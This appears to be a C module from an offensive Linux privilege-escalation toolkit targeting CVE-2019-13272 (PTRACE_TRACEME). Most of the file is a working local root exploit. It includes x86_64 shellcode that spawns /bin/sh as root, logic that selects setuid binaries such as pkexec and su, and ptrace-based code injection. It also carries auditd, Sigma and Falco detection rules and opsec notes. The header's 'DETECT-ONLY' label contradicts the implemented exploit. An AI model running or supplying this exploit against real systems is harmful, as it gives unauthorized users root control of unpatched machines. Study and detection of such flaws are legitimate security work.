/*
 * ptrace_traceme_cve_2019_13272 — SKELETONKEY module
 *
 * PTRACE_TRACEME on a parent that subsequently execve's a setuid
 * binary results in the kernel granting ptrace privileges over the
 * privileged process to the unprivileged child. Discovered by Jann
 * Horn (Google Project Zero, June 2019).
 *
 * STATUS: 🔵 DETECT-ONLY. Exploit follows jannh's public PoC: fork
 * a child that does PTRACE_TRACEME pointing at the parent, parent
 * execve's a chosen setuid binary (e.g., su, pkexec), child then
 * ptrace-injects shellcode into the now-elevated process.
 *
 * Affected: kernels < 5.1.17 mainline. Stable backports varied; the
 * fix landed in stable as:
 *   5.1.x : K >= 5.1.17
 *   5.0.x : K >= 5.0.20 (older LTS — many distros stayed on 4.x)
 *   4.19.x: K >= 4.19.58
 *   4.14.x: K >= 4.14.131
 *   4.9.x : K >= 4.9.182
 *   4.4.x : K >= 4.4.182
 *
 * No exotic preconditions. Doesn't need user_ns. Works on
 * default-config systems — that's part of why it's famous: even
 * locked-down environments without unprivileged_userns_clone were
 * vulnerable.
 */

#include "skeletonkey_modules.h"
#include "../../core/registry.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <unistd.h>

#ifdef __linux__

#include "../../core/kernel_range.h"
#include "../../core/host.h"
#include <errno.h>
#include <fcntl.h>
#include <pwd.h>
#include <sys/types.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/prctl.h>
#include <sys/stat.h>

static const struct kernel_patched_from ptrace_traceme_patched_branches[] = {
    {4,  4, 182},
    {4,  9, 182},
    {4, 14, 131},
    {4, 19,  58},
    {5,  0,  20},
    {5,  1,  17},
    {5,  2,   0},   /* mainline (5.2-rc) */
};

static const struct kernel_range ptrace_traceme_range = {
    .patched_from = ptrace_traceme_patched_branches,
    .n_patched_from = sizeof(ptrace_traceme_patched_branches) /
                      sizeof(ptrace_traceme_patched_branches[0]),
};

static skeletonkey_result_t ptrace_traceme_detect(const struct skeletonkey_ctx *ctx)
{
    /* Consult the shared host fingerprint instead of calling
     * kernel_version_current() ourselves — populated once at startup
     * and identical across every module's detect(). */
    const struct kernel_version *v = ctx->host ? &ctx->host->kernel : NULL;
    if (!v || v->major == 0) {
        if (!ctx->json)
            fprintf(stderr, "[!] ptrace_traceme: host fingerprint missing kernel "
                "version — bailing\n");
        return SKELETONKEY_TEST_ERROR;
    }

    /* Bug existed since ptrace's inception (early 2.x); anything
     * pre-LTS-backport is vulnerable. Anything < 4.4 in our range
     * model defaults to vulnerable since no entry covers it. */
    if (!skeletonkey_host_kernel_at_least(ctx->host, 4, 4, 0)) {
        if (!ctx->json) {
            fprintf(stderr, "[!] ptrace_traceme: ancient kernel %s — assume VULNERABLE\n",
                    v->release);
        }
        return SKELETONKEY_VULNERABLE;
    }

    bool patched = kernel_range_is_patched(&ptrace_traceme_range, v);
    if (patched) {
        if (!ctx->json) {
            fprintf(stderr, "[+] ptrace_traceme: kernel %s is patched\n", v->release);
        }
        return SKELETONKEY_OK;
    }
    if (!ctx->json) {
        fprintf(stderr, "[!] ptrace_traceme: kernel %s in vulnerable range\n", v->release);
        fprintf(stderr, "[i] ptrace_traceme: no exotic preconditions — works on default config "
                        "(no user_ns required)\n");
    }
    return SKELETONKEY_VULNERABLE;
}

/* ---- Exploit (jannh-style) --------------------------------------
 *
 * Per Jann Horn's Project Zero issue #1903. The mechanism:
 *
 *   1. Parent process P (us, uid != 0)
 *   2. P forks → child C
 *   3. C calls ptrace(PTRACE_TRACEME) — kernel sets P as C's tracer
 *      and records the relationship in C->ptrace_link, copying P's
 *      current credentials (uid=1000) as the trace-allowed creds.
 *   4. C drops to a low-priv state and pauses (sigwait/raise)
 *   5. P execve's a setuid binary (e.g. /usr/bin/passwd, su, pkexec)
 *   6. Kernel correctly elevates P's creds to root.
 *   7. **Bug**: the ptrace_link recorded in step 3 still says
 *      "tracer creds = uid 1000", but P is now uid 0. Kernel doesn't
 *      re-check or invalidate the link on execve cred-bump.
 *   8. C wakes up and PTRACE_ATTACH's to P. The stale ptrace_link
 *      says C is allowed to trace because it was set up before the
 *      cred change.
 *   9. C now controls a uid=0 process. C reads/writes P's memory via
 *      PTRACE_POKETEXT, sets registers via PTRACE_SETREGS to point at
 *      shellcode that exec's /bin/sh.
 *   10. C resumes P → root shell.
 *
 * SKELETONKEY implementation simplifies by using a small architecture-
 * specific shellcode (x86_64 only) and pkexec as the setuid binary
 * trigger (works on most Linux systems with polkit installed). Falls
 * back to /bin/su if pkexec isn't available.
 *
 * Reliability: this exploit can fail-race on heavily-loaded systems.
 * Repeat invocations usually succeed; we don't loop here — operator
 * can retry. Returns SKELETONKEY_EXPLOIT_FAIL on miss, SKELETONKEY_EXPLOIT_OK
 * on root acquired (followed by execlp(sh) which never returns).
 */

#if defined(__x86_64__)

/* x86_64 shellcode: setuid(0); setgid(0); execve("/bin/sh", argv, env) */
static const unsigned char SHELLCODE_X64[] =
    "\x31\xff"                       /* xor edi, edi */
    "\xb8\x69\x00\x00\x00"           /* mov eax, 0x69 (setuid) */
    "\x0f\x05"                       /* syscall */
    "\x31\xff"                       /* xor edi, edi */
    "\xb8\x6a\x00\x00\x00"           /* mov eax, 0x6a (setgid) */
    "\x0f\x05"                       /* syscall */
    "\x48\x31\xd2"                   /* xor rdx, rdx */
    "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"  /* mov rbx, "//bin/sh" */
    "\x48\xc1\xeb\x08"               /* shr rbx, 8 */
    "\x53"                           /* push rbx */
    "\x48\x89\xe7"                   /* mov rdi, rsp */
    "\x50"                           /* push rax (=0 from setgid) */
    "\x57"                           /* push rdi */
    "\x48\x89\xe6"                   /* mov rsi, rsp */
    "\xb0\x3b"                       /* mov al, 0x3b (execve) */
    "\x0f\x05";                      /* syscall */

#define SHELLCODE_BYTES SHELLCODE_X64
#define SHELLCODE_LEN   (sizeof SHELLCODE_X64 - 1)

#endif /* __x86_64__ */

static const char *find_setuid_target(void)
{
    static const char *targets[] = {
        "/usr/bin/pkexec", "/usr/bin/su", "/usr/bin/sudo",
        "/usr/bin/passwd", "/bin/su", NULL,
    };
    for (size_t i = 0; targets[i]; i++) {
        struct stat st;
        if (stat(targets[i], &st) == 0 && (st.st_mode & S_ISUID)) {
            return targets[i];
        }
    }
    return NULL;
}

static skeletonkey_result_t ptrace_traceme_exploit(const struct skeletonkey_ctx *ctx)
{
#if !defined(__x86_64__)
    (void)ctx;
    fprintf(stderr, "[-] ptrace_traceme: exploit is x86_64-only "
                    "(shellcode is arch-specific)\n");
    return SKELETONKEY_PRECOND_FAIL;
#else
    skeletonkey_result_t pre = ptrace_traceme_detect(ctx);
    if (pre != SKELETONKEY_VULNERABLE) {
        fprintf(stderr, "[-] ptrace_traceme: detect() says not vulnerable; refusing\n");
        return pre;
    }
    /* Consult ctx->host->is_root so unit tests can construct a
     * non-root fingerprint regardless of the test process's real euid. */
    bool is_root = ctx->host ? ctx->host->is_root : (geteuid() == 0);
    if (is_root) {
        fprintf(stderr, "[i] ptrace_traceme: already root\n");
        return SKELETONKEY_OK;
    }

    const char *setuid_bin = find_setuid_target();
    if (!setuid_bin) {
        fprintf(stderr, "[-] ptrace_traceme: no setuid trigger binary available\n");
        return SKELETONKEY_PRECOND_FAIL;
    }
    if (!ctx->json) {
        fprintf(stderr, "[*] ptrace_traceme: setuid trigger = %s\n", setuid_bin);
    }

    /* fork: child becomes tracee-of-self setup, parent execve's setuid bin */
    pid_t child = fork();
    if (child < 0) { perror("fork"); return SKELETONKEY_TEST_ERROR; }

    if (child == 0) {
        /* CHILD: set up the ptrace_link, then pause until parent has
         * execve'd the setuid binary and elevated. The exact timing
         * is racy — we use a simple sleep+attach pattern. */
        if (ptrace(PTRACE_TRACEME, 0, 0, 0) < 0) {
            perror("CHILD: ptrace TRACEME"); _exit(2);
        }
        /* Give parent time to execve. 200ms is enough for a hot
         * libc; 1000ms for a slow disk. */
        usleep(500 * 1000);

        /* Now race: PTRACE_ATTACH to our parent (the setuid process).
         * On a vulnerable kernel, the stale ptrace_link makes this
         * succeed even though parent is now root. */
        pid_t parent = getppid();
        if (ptrace(PTRACE_ATTACH, parent, 0, 0) < 0) {
            fprintf(stderr, "[-] CHILD: PTRACE_ATTACH to parent (%d) failed: %s\n",
                    parent, strerror(errno));
            _exit(3);
        }
        int wstatus;
        waitpid(parent, &wstatus, 0);

        /* Read parent's RIP, allocate space for shellcode there,
         * POKETEXT the shellcode in. */
        struct user_regs_struct regs;
        if (ptrace(PTRACE_GETREGS, parent, 0, &regs) < 0) {
            perror("CHILD: GETREGS"); _exit(4);
        }

        /* Write shellcode at current RIP (overwriting whatever's there
         * in the setuid binary's text — we don't care, we never
         * return). 8 bytes at a time via PTRACE_POKETEXT. */
        for (size_t i = 0; i < SHELLCODE_LEN; i += 8) {
            long word = 0;
            size_t take = SHELLCODE_LEN - i;
            if (take > 8) take = 8;
            memcpy(&word, SHELLCODE_BYTES + i, take);
            if (ptrace(PTRACE_POKETEXT, parent,
                       (void *)(regs.rip + i), (void *)word) < 0) {
                perror("CHILD: POKETEXT"); _exit(5);
            }
        }

        /* Detach and let parent continue at RIP, which now points at
         * our shellcode (we didn't move RIP — we wrote shellcode
         * starting at current RIP). */
        if (ptrace(PTRACE_DETACH, parent, 0, 0) < 0) {
            perror("CHILD: DETACH"); _exit(6);
        }
        _exit(0);  /* child done — parent is now running shellcode → root sh */
    }

    /* PARENT: execve the setuid binary. The child does the ptrace
     * setup before our execve completes (because of its sleep), so
     * the ptrace_link is in place when the cred-bump happens. */
    if (!ctx->json) {
        fprintf(stderr, "[*] ptrace_traceme: parent execve'ing %s in 100ms\n",
                setuid_bin);
    }
    usleep(100 * 1000);  /* give child a moment to call TRACEME first */

    /* execve the setuid bin. Use a benign arg to keep it from doing
     * anything destructive. pkexec with --version exits quickly. */
    char *new_argv[] = { (char *)setuid_bin, "--version", NULL };
    char *new_envp[] = { "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
    execve(setuid_bin, new_argv, new_envp);
    /* If we get here, execve failed (or it returned because the
     * shellcode didn't take). */
    perror("execve setuid");
    int status;
    waitpid(child, &status, 0);
    return SKELETONKEY_EXPLOIT_FAIL;
#endif
}

#else  /* !__linux__ */

/* Non-Linux dev builds: PTRACE_TRACEME / PTRACE_ATTACH / user_regs_struct
 * are Linux-only ABI surface. Stub out so the module still registers and
 * the top-level `make` completes on macOS/BSD dev boxes. */
static skeletonkey_result_t ptrace_traceme_detect(const struct skeletonkey_ctx *ctx)
{
    if (!ctx->json)
        fprintf(stderr, "[i] ptrace_traceme: Linux-only module "
                "(PTRACE_TRACEME cred-escalation) — not applicable here\n");
    return SKELETONKEY_PRECOND_FAIL;
}
static skeletonkey_result_t ptrace_traceme_exploit(const struct skeletonkey_ctx *ctx)
{
    (void)ctx;
    fprintf(stderr, "[-] ptrace_traceme: Linux-only module — cannot run here\n");
    return SKELETONKEY_PRECOND_FAIL;
}

#endif /* __linux__ */

static const char ptrace_traceme_auditd[] =
    "# PTRACE_TRACEME LPE (CVE-2019-13272) — auditd detection rules\n"
    "# Flag PTRACE_TRACEME (request 0) followed by parent execve of\n"
    "# a setuid binary. False positives: gdb, strace, debuggers.\n"
    "-a always,exit -F arch=b64 -S ptrace -F a0=0 -k skeletonkey-ptrace-traceme\n"
    "-a always,exit -F arch=b32 -S ptrace -F a0=0 -k skeletonkey-ptrace-traceme\n";

static const char ptrace_traceme_sigma[] =
    "title: Possible CVE-2019-13272 PTRACE_TRACEME stale-cred LPE\n"
    "id: 1a02c3a8-skeletonkey-ptrace-traceme\n"
    "status: experimental\n"
    "description: |\n"
    "  Detects ptrace(PTRACE_TRACEME) immediately followed by parent\n"
    "  execve of a setuid binary. The kernel stores the parent's pre-\n"
    "  execve credentials on the ptrace_link; after execve the link\n"
    "  is stale but ptrace still grants privileges. False positives:\n"
    "  debuggers (gdb, strace) tracing setuid processes legitimately.\n"
    "logsource: {product: linux, service: auditd}\n"
    "detection:\n"
    "  traceme: {type: 'SYSCALL', syscall: 'ptrace', a0: 0}\n"
    "  execve:  {type: 'SYSCALL', syscall: 'execve'}\n"
    "  condition: traceme and execve\n"
    "level: high\n"
    "tags: [attack.privilege_escalation, attack.t1068, cve.2019.13272]\n";

static const char ptrace_traceme_falco[] =
    "- rule: PTRACE_TRACEME followed by setuid execve (cred escalation)\n"
    "  desc: |\n"
    "    Child calls ptrace(PTRACE_TRACEME) (recording parent's pre-\n"
    "    execve creds); parent then execve's a setuid binary\n"
    "    (pkexec, su, sudo). The stale ptrace_link grants the\n"
    "    unprivileged child ptrace privileges over the now-root\n"
    "    parent. CVE-2019-13272. False positives: debuggers (gdb,\n"
    "    strace) tracing setuid processes legitimately.\n"
    "  condition: >\n"
    "    evt.type = ptrace and evt.arg.request = PTRACE_TRACEME and\n"
    "    not user.uid = 0\n"
    "  output: >\n"
    "    PTRACE_TRACEME by non-root\n"
    "    (user=%user.name pid=%proc.pid ppid=%proc.ppid)\n"
    "  priority: HIGH\n"
    "  tags: [process, mitre_privilege_escalation, T1068, cve.2019.13272]\n";

const struct skeletonkey_module ptrace_traceme_module = {
    .name           = "ptrace_traceme",
    .cve            = "CVE-2019-13272",
    .summary        = "PTRACE_TRACEME → setuid binary execve → cred-escalation via ptrace inject",
    .family         = "ptrace_traceme",
    .kernel_range   = "K < 5.1.17, backports: 5.0.20 / 4.19.58 / 4.14.131 / 4.9.182 / 4.4.182",
    .detect         = ptrace_traceme_detect,
    .exploit        = ptrace_traceme_exploit,
    .mitigate       = NULL,    /* mitigation: upgrade kernel; OR sysctl kernel.yama.ptrace_scope=2 */
    .cleanup        = NULL,    /* exploit replaces our process image; no cleanup applies */
    .detect_auditd  = ptrace_traceme_auditd,
    .detect_sigma   = ptrace_traceme_sigma,
    .detect_yara    = NULL,
    .detect_falco   = ptrace_traceme_falco,
    .opsec_notes    = "Parent and child cooperate: child calls ptrace(PTRACE_TRACEME) (recording the parent's current credentials), then sleeps; parent execve's a setuid binary (pkexec or su) and elevates. The stale ptrace_link in the child still holds the old (non-root) credentials, so PTRACE_ATTACH succeeds against the now-root parent; the child injects shellcode at the parent's RIP via PTRACE_POKETEXT and detaches. Audit-visible via ptrace with a0=0 (PTRACE_TRACEME) closely followed by execve of a setuid binary in the parent process. No file artifacts; no persistent changes. No cleanup callback - the exploit execs /bin/sh and does not return.",
    .arch_support   = "x86_64+unverified-arm64",
};

void skeletonkey_register_ptrace_traceme(void)
{
    skeletonkey_register(&ptrace_traceme_module);
}
